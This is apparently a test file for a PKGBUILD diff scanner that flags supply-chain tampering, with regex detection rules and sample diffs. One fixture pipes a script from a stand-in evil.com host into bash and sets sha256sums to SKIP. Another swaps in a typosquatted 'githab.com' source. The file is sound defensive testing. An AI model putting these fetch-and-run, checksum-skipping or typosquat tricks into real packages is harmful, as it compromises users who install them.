FULL_RULES = [
    {"id": "R001", "name": "Remote Script Execution", "pattern": r"curl.*\|\s*(bash|sh|python|zsh)", "severity": "CRITICAL", "category": "network_execution", "match_target": "resolved"},
    {"id": "R002", "name": "Wget Pipe to Shell", "pattern": r"wget.*\|\s*(bash|sh|python|zsh)", "severity": "CRITICAL", "category": "network_execution", "match_target": "resolved"},
    {"id": "R003", "name": "Base64 Decode and Execute", "pattern": r"base64.*\-d.*\|", "severity": "CRITICAL", "category": "obfuscation", "match_target": "resolved"},
    {"id": "R004", "name": "Checksum Disabled", "pattern": r"sha256sums\s*=\s*\(?\s*['\"]?(?:SKIP|NONE)['\"]?", "severity": "HIGH", "category": "integrity", "match_target": "raw_line"},
    {"id": "R005", "name": "Checksum Emptied", "pattern": r"sha256sums\s*=\s*\(\s*\)", "severity": "HIGH", "category": "integrity", "match_target": "raw_line"},
    {"id": "R006", "name": "Insecure Download Protocol", "pattern": r"https?://.*\.tar\.gz.*\|", "severity": "MEDIUM", "category": "network_execution", "match_target": "resolved"},
    {"id": "R007", "name": "Install File Modification", "pattern": r"\+.*\.install.*", "severity": "MEDIUM", "category": "installer", "match_target": "raw_line"},
    {"id": "R008", "name": "Unexpected File Download", "pattern": r"\b(python|ruby|perl)\s+-c\s+https?://", "severity": "HIGH", "category": "network_execution", "match_target": "resolved"},
    {"id": "R009", "name": "Privilege Escalation", "pattern": r"\bsudo\b", "severity": "CRITICAL", "category": "privilege", "match_target": "raw_line", "scope": ["function_body"]},
    {"id": "R010", "name": "Uses curl in PKGBUILD", "pattern": r"\bcurl\s", "severity": "LOW", "category": "network_usage", "match_target": "raw_line", "scope": ["function_body"]},
    {"id": "R011", "name": "Uses wget in PKGBUILD", "pattern": r"\bwget\s", "severity": "LOW", "category": "network_usage", "match_target": "raw_line", "scope": ["function_body"]},
]


def test_analysis_imports():
    from trustsight.scoring import calculate_score
    from trustsight.differ import extract_urls_from_diff
    from trustsight.tokenizer import tokenize_and_resolve
    from trustsight.rules import apply_rules
    from trustsight.buckets import classify_urls
    from trustsight.llm import fallback_verdict

    assert callable(calculate_score)
    assert callable(extract_urls_from_diff)
    assert callable(tokenize_and_resolve)
    assert callable(apply_rules)
    assert callable(classify_urls)
    assert callable(fallback_verdict)


def test_pipeline_stage_integration():
    from trustsight.differ import extract_urls_from_diff
    from trustsight.tokenizer import tokenize_and_resolve
    from trustsight.rules import apply_rules, get_raw_diff_lines
    from trustsight.buckets import classify_urls
    from trustsight.scoring import calculate_score
    from trustsight.schema import NoveltyContext

    diff = """+source=("https://evil.com/payload.tar.gz")
+sha256sums=('SKIP')
+package() {
+  curl -s https://evil.com/hook.sh | bash
+  chmod +x $_helper
+}"""

    source_changes = extract_urls_from_diff(diff)
    assert "https://evil.com/payload.tar.gz" in source_changes.added_urls
    assert source_changes.checksum_behavior == "changed_from_sha256_to_skip"

    buckets = classify_urls(source_changes.added_urls)
    assert buckets.get("https://evil.com/payload.tar.gz") == "unknown"

    resolved, unresolved = tokenize_and_resolve(diff)
    raw_lines = get_raw_diff_lines(diff)

    triggered = apply_rules(resolved, raw_lines, FULL_RULES)
    rule_ids = [r["rule_id"] for r in triggered]
    assert "R001" in rule_ids
    assert "R004" in rule_ids
    assert "R010" in rule_ids

    config = {
        "severity_weights": {"CRITICAL": 40, "HIGH": 25, "MEDIUM": 15, "LOW": 5, "INFO": 0},
        "source_bucket_weights": {"trusted_forge": -10, "official": 0, "raw_hosting": 15, "unknown": 20},
        "novelty_weights": {"url_first_globally": 15, "url_first_in_package": 10, "maintainer_first_in_package": 20},
    }
    score, breakdown, level = calculate_score(triggered, buckets, NoveltyContext(
        url_first_seen_in_this_package=True,
        url_first_seen_globally=True,
        observation_count=50,
    ), config)
    assert score > 50
    assert level in ("High", "Critical")


def test_pipeline_benign_package():
    from trustsight.differ import extract_urls_from_diff
    from trustsight.tokenizer import tokenize_and_resolve
    from trustsight.rules import apply_rules, get_raw_diff_lines
    from trustsight.buckets import classify_urls
    from trustsight.scoring import calculate_score
    from trustsight.schema import NoveltyContext

    diff = """+pkgver=2.0.0
+pkgrel=2
+source=("https://github.com/trusted/project/archive/v2.0.0.tar.gz")
+sha256sums=('abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890')"""

    source_changes = extract_urls_from_diff(diff)
    assert len(source_changes.added_urls) == 1
    assert source_changes.checksum_behavior == "checksum_added_or_changed"

    buckets = classify_urls(source_changes.added_urls)
    assert buckets.get("https://github.com/trusted/project/archive/v2.0.0.tar.gz") == "trusted_forge"

    resolved, unresolved = tokenize_and_resolve(diff)
    raw_lines = get_raw_diff_lines(diff)
    triggered = apply_rules(resolved, raw_lines, FULL_RULES)

    config = {
        "severity_weights": {"CRITICAL": 40, "HIGH": 25, "MEDIUM": 15, "LOW": 5, "INFO": 0},
        "source_bucket_weights": {"trusted_forge": -10, "official": 0, "raw_hosting": 15, "unknown": 20},
        "novelty_weights": {},
    }
    score, breakdown, level = calculate_score(triggered, buckets, NoveltyContext(), config)
    assert score <= 10
    assert level == "Low"


def test_pipeline_subtly_malicious():
    from trustsight.differ import extract_urls_from_diff
    from trustsight.tokenizer import tokenize_and_resolve
    from trustsight.rules import apply_rules, get_raw_diff_lines
    from trustsight.buckets import classify_urls
    from trustsight.scoring import calculate_score
    from trustsight.schema import NoveltyContext

    diff = """-source=("https://github.com/trusted/project/archive/v1.0.0.tar.gz")
+source=("https://github.com/trusted/project/archive/v1.0.0.tar.gz")
-sha256sums=('abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890')
+sha256sums=('SKIP')"""

    source_changes = extract_urls_from_diff(diff)
    assert source_changes.checksum_behavior == "changed_from_sha256_to_skip"

    buckets = classify_urls(source_changes.added_urls)
    assert buckets.get("https://github.com/trusted/project/archive/v1.0.0.tar.gz") == "trusted_forge"

    resolved, unresolved = tokenize_and_resolve(diff)
    raw_lines = get_raw_diff_lines(diff)
    triggered = apply_rules(resolved, raw_lines, FULL_RULES)
    rule_ids = [r["rule_id"] for r in triggered]
    assert "R004" in rule_ids

    config = {
        "severity_weights": {"CRITICAL": 40, "HIGH": 25, "MEDIUM": 15, "LOW": 5, "INFO": 0},
        "source_bucket_weights": {"trusted_forge": -10, "official": 0, "raw_hosting": 15, "unknown": 20},
        "novelty_weights": {"url_first_globally": 15, "url_first_in_package": 10, "maintainer_first_in_package": 20},
    }
    score, breakdown, level = calculate_score(triggered, buckets, NoveltyContext(), config)
    assert score == 15
    assert level == "Low"


def test_pipeline_hard_to_spot_malicious():
    from trustsight.differ import extract_urls_from_diff
    from trustsight.tokenizer import tokenize_and_resolve
    from trustsight.rules import apply_rules, get_raw_diff_lines
    from trustsight.buckets import classify_urls
    from trustsight.scoring import calculate_score
    from trustsight.schema import NoveltyContext

    diff = """-source=("https://github.com/trusted/project/archive/v2.0.0.tar.gz")
+source=("https://githab.com/trusted/project/archive/v2.0.0.tar.gz")"""

    source_changes = extract_urls_from_diff(diff)
    assert "https://githab.com/trusted/project/archive/v2.0.0.tar.gz" in source_changes.added_urls

    buckets = classify_urls(source_changes.added_urls)
    assert buckets.get("https://githab.com/trusted/project/archive/v2.0.0.tar.gz") == "unknown"

    resolved, unresolved = tokenize_and_resolve(diff)
    raw_lines = get_raw_diff_lines(diff)
    triggered = apply_rules(resolved, raw_lines)
    assert len(triggered) == 0

    config = {
        "severity_weights": {"CRITICAL": 40, "HIGH": 25, "MEDIUM": 15, "LOW": 5, "INFO": 0},
        "source_bucket_weights": {"trusted_forge": -10, "official": 0, "raw_hosting": 15, "unknown": 20},
        "novelty_weights": {"url_first_globally": 15, "url_first_in_package": 10, "maintainer_first_in_package": 20},
    }
    score, breakdown, level = calculate_score(triggered, buckets, NoveltyContext(
        url_first_seen_globally=True,
        observation_count=50,
    ), config)
    assert score == 35
    assert level == "Medium"


# --- Structural anomaly tests (R014, R016) ---

def test_pkgver_changed_detected():
    from trustsight.analysis import _pkgver_changed_in_diff
    diff = """-pkgver=1.0.0
+pkgver=2.0.0"""
    assert _pkgver_changed_in_diff(diff)


def test_pkgver_unchanged():
    from trustsight.analysis import _pkgver_changed_in_diff
    diff = """+pkgver=2.0.0"""
    assert not _pkgver_changed_in_diff(diff)


def test_url_changed_no_version_bump():
    from trustsight.scoring import calculate_score
    from trustsight.schema import NoveltyContext

    triggered = [
        {"rule_id": "R014", "name": "Source URL Changed Without Version Bump", "severity": "MEDIUM", "category": "integrity", "match": "URLs changed"},
    ]
    config = {
        "severity_weights": {"MEDIUM": 15},
        "source_bucket_weights": {},
        "novelty_weights": {},
    }
    score, breakdown, level = calculate_score(triggered, {}, NoveltyContext(), config)
    assert score == 15
    assert level == "Low"
    assert any(e.rule_id == "R014" for e in breakdown)


def test_checksum_changed_no_url_change():
    from trustsight.scoring import calculate_score
    from trustsight.schema import NoveltyContext

    triggered = [
        {"rule_id": "R016", "name": "Checksum Changed Without Source Change", "severity": "HIGH", "category": "integrity", "match": "sha256sums changed"},
    ]
    config = {
        "severity_weights": {"HIGH": 25},
        "source_bucket_weights": {},
        "novelty_weights": {},
    }
    score, breakdown, level = calculate_score(triggered, {}, NoveltyContext(), config)
    assert score == 25
    assert level == "Medium"
    assert any(e.rule_id == "R016" for e in breakdown)


# --- Offline novelty tracking must match the live path ---

def test_scan_diff_normalizes_urls_for_novelty():
    """A routine version bump is not novelty. check_url_novelty applies
    normalize_url in the live path; the offline replay must too, or every
    bump reads as a first-seen URL."""
    from trustsight.analysis import scan_diff

    cfg = {"severity_weights": {}, "novelty_weights": {"url_first_globally": 15}}
    seen = {}
    d1 = '+source=("https://example.com/tool-1.0.0.tar.gz")\n'
    d2 = '+source=("https://example.com/tool-1.0.1.tar.gz")\n'

    f1 = scan_diff(d1, rules=[], config=cfg, package_name="p", seen_urls=seen)
    f2 = scan_diff(d2, rules=[], config=cfg, package_name="p", seen_urls=seen)
    assert f1.novelty_context.url_first_seen_globally is True
    assert f2.novelty_context.url_first_seen_globally is False


def test_scan_diff_tracks_global_novelty_across_packages():
    """'First seen globally' means across every package, not merely first
    in this one."""
    from trustsight.analysis import scan_diff

    cfg = {"severity_weights": {}, "novelty_weights": {}}
    seen = {}
    diff = '+source=("https://shared.example.com/lib-1.0.tar.gz")\n'

    a = scan_diff(diff, rules=[], config=cfg, package_name="pkg-a", seen_urls=seen)
    b = scan_diff(diff, rules=[], config=cfg, package_name="pkg-b", seen_urls=seen)

    assert a.novelty_context.url_first_seen_globally is True
    assert b.novelty_context.url_first_seen_in_this_package is True
    assert b.novelty_context.url_first_seen_globally is False


def test_scan_diff_ors_novelty_across_multiple_urls():
    """A familiar URL must not mask a novel one listed after it."""
    from trustsight.analysis import scan_diff

    cfg = {"severity_weights": {}, "novelty_weights": {}}
    seen = {}
    first = '+source=("https://known.example.com/a-1.0.tar.gz")\n'
    scan_diff(first, rules=[], config=cfg, package_name="p", seen_urls=seen)

    both = (
        '+source=("https://known.example.com/a-1.0.tar.gz"\n'
        '+        "https://brandnew.example.org/b-1.0.tar.gz")\n'
    )
    fact = scan_diff(both, rules=[], config=cfg, package_name="p", seen_urls=seen)
    assert fact.novelty_context.url_first_seen_globally is True
